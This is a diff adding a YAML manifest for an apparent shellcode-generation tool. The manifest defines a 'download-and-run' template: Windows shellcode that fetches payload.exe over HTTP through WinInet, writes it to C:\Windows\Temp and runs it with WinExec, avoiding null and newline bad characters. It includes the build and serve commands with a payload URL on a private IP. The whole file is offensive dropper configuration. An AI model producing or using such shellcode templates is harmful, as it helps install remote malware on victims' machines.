@@ -1,0 +1,53 @@
+template: http_download
+# HTTP download-and-run via WinInet.
+# Uses InternetOpenA + InternetOpenUrlA + InternetReadFile to fetch a file
+# from an HTTP server, write it to disk, then execute via WinExec.
+#
+# No Winsock setup required -- wininet.dll handles the full HTTP stack.
+#
+# Build:
+#   uv run emitter Tools/emitter/manifests/http_download.yaml \
+#       --url "http://192.168.1.10:8000/payload.exe" \
+#       --dst "C:\Windows\Temp\payload.exe" --out emitter_out/
+#
+# Serve the file:
+#   python3 -m http.server 8000 --bind 192.168.1.10
+badchars: ["00", "0a", "0d"]
+
+functions:
+  - LoadLibraryA
+  - InternetOpenA
+  - InternetOpenUrlA
+  - InternetReadFile
+  - InternetCloseHandle
+  - VirtualAlloc
+  - CreateFileA
+  - WriteFile
+  - CloseHandle
+  - WinExec
+  - ExitProcess
+
+variables:
+  - inet_session
+  - inet_url
+  - virt_buf
+  - file_handle
+  - bytes_read
+  - bytes_total
+
+strings:
+  - label: wininet_dll
+    value: wininet.dll
+    method: push
+  - label: user_agent
+    value: Mozilla/5.0
+    method: mov
+    dest: edi
+  - label: url
+    value: "http://192.168.1.10:8000/payload.exe"
+    method: mov
+    dest: edi
+  - label: dst_path
+    value: "C:\\Windows\\Temp\\payload.exe"
+    method: mov
+    dest: edi
